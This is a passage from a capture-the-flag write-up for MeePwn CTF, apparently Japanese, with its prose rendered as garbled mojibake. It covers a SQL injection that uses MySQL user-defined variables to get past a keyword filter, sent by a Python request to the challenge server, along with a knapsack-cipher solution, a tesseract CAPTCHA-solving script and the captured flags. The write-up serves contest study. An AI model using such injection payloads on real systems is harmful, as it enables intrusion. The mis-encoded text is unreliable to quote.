Br0kenMySQL v2 ã§ãƒ•ãƒ©ã‚°ã¨ä¸€ç·’ã«å¾—ã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€Br0kenMySQL v2 ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã« `time|date|sec|day` ãŒå¢—ãˆãŸã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

`@x := 2` ã¿ãŸã„ãªæ„Ÿã˜ã§ãƒ¦ãƒ¼ã‚¶å®šç¾©å¤‰æ•°ã‚’ä½¿ã„ã¾ã—ã‚‡ã†ã€‚

```python
import requests
import urllib

print requests.get('http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?id=' + urllib.quote('case @x when 2 then 1 else @x := 2 end')).content
```

ã“ã‚Œã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
MeePwnCTF{_I_g1ve__uPPPPPPPP_see_you_next_Year}
```

## [Crypto 100] nub_cryptosystem

[nub_cryptosystem.py](https://gist.github.com/quandqn/e7d874857b0e31c9a55274fa02d5c944)ã€[pubkey.txt](https://gist.githubusercontent.com/quandqn/c3f0758d3c03d395d6174b2e5f1e8443/raw/66ab7c04e0132d1fd92d9def6cd33315cda4d918/pubkey.txt)ã€[enc.txt](https://gist.githubusercontent.com/quandqn/ab5326318e3333609100cd876b1bfedc/raw/1e2669e02ff166123277d56c30e6e5eb24d127da/enc.txt) ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚

Merkle-Hellman ãƒŠãƒƒãƒ—ã‚µãƒƒã‚¯æš—å·ã®ã‚ˆã†ã§ã™ã€‚éå»åŒæ§˜ã®å•é¡ŒãŒå‡ºé¡Œã•ã‚ŒãŸéš›ã«æ›¸ã‹ã‚ŒãŸ [write-up](https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/archaic) ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§è§£ã‘ã¾ã—ãŸã€‚

```
MeePwnCTF{Merkleee-Hellmannn!}
```

## [Misc 149] AreYouHuman

ä»¥ä¸‹ã®ã‚ˆã†ãª CAPTCHA ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã®ã§ç­”ãˆã‚‹ã€ã¨ã„ã†ã®ã‚’ä½•åº¦ã‚‚ç¹°ã‚Šè¿”ã™å•é¡Œã§ã—ãŸã€‚

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@-----@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@---  ---@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@ -----@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@- -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@--@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@- -@@@@@@@@@@@@@@@@@---------@@@@@---    -@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@- -@@@@@@@@@@@@@@@@@@  - - --@@@--    ----@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@- ---- -----  ----@@@--@@---@@@@---@- -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@- ------@- -------@@@--@@@@@@@@@@@@@- -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@---@@@@@@---@@@@@@@@@--@@@@@@@@@@@@@- @@@@---@@@@--@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@--@@@@@@@---@@@@@@@@@---@@@--@@@@@@@- @@@@-  -@@@- @@@@@@@@@@@@@@@@@
@@@@@@@@@@@@--@@@@@@@---@@@@@@@@@-      --@@@@@@- @@@@- --@@@- -@@@@@@@@@@@@@@@@
@@@@@@@@@@@@--------@@--------@@@--------@@@@@@@- -@@@- ---@@- -@@@@@@@@@@@@@@@@
@@@@@@@@@@@@-   ----@@- ---- -@@@--@@@@@@@@@@@@@- @@@@@ ---@@---@@@@@@@@@@@@@@@@
@@@@@@@@@@@@-----@@@@@---@@@--@@@- @@@@@@@@@@@@@- @@@@@--@--@@--@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@--@@@@@@@@@--@@@@@@@@@@@@@- @@@@@- @@-@@- @@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@--@@@@@@@@@- -------@@@@@@- -@@@@- -@--@- -@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@- -----@@@@--  -----@@@@@@--@@@@@- -@@--- -@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@-     ---@@@@@@@@@@@@@@@@@@@@@@@@---@@--- -@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@---------@@@@@@@@@@@@@@@@@@@@@@@@---@@@----@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@--@@@-  -@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@--@@@@- --@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-@@@@@---@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
```

tesseract ã¨äººåŠ› OCR ã§é ‘å¼µã‚Šã¾ã—ã‚‡ã†ã€‚

```python
import hashlib
import subprocess
from pwn import *
from PIL import Image

def captcha_to_image(s):
  w, h = 80, 30
  im = Image.new('RGB', (w, h))
  pix = im.load()
  for y, line in enumerate(s):
    for x, c in enumerate(line):
      if c == '@':
        pix[x, y] = (255, 255, 255)
      else:
        pix[x, y] = (0, 0, 0)
  return im

def image_to_text(f):
  return subprocess.check_output(['tesseract', f, 'stdout', '-c', 'tessedit_char_whitelist=MEPWNCTF', '-psm', '6']).strip().replace(' ', '')

d = {
  '2bcb3234311ac086a82864174546572f': 'MWWMN',
  '66bbbf25bd03a12ba5c6a2fc07accc65': 'CMNWE',
  'e5767911716e8be2c2efab74dc0a678b': 'FNFMF',
   ...
  'e73eec6e133586613dc602551a36ae22': 'NWCMW',
  '724e3445175e1f6564c8cb5efd524d69': 'TNPFC',
  '781d3cff6a66ae36ca4bac16ae0f11be': 'MNMMT'
}

if __name__ == '__main__':
  s = remote('128.199.113.197', 1111)
  s.recvuntil('Are you ready? [Y/n]')
  s.sendline('Y')

  for i in range(100):
    t = s.recvuntil('Captcha')
    log.info(t)
    s.recvuntil(' =')
    captcha_to_image(t.splitlines()[:-1]).save('tmp.png')
    res = image_to_text('tmp.png')
    h = hashlib.md5(t).hexdigest()
    if h in d:
      log.info('found!')
      res = d[h]
    if len(res) != 5 and i > 80:
      res = raw_input('> ').upper()
    log.info('%s: %s' % (h, res))
    s.sendline(res)

  s.interactive()
```

```
MeePwnCTF{I_am_ju5t_a_little_Pikalong}
```

## [Misc 100] Feedback

ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã‚’é€ã£ã¦ã€å•é¡Œæ–‡ã«æ›¸ã‹ã‚ŒãŸãƒ•ãƒ©ã‚°ã‚’é€ä¿¡ã™ã‚‹ã¨ãƒã‚¤ãƒ³ãƒˆãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
MeePwnCTF{From MeePwn with love}
```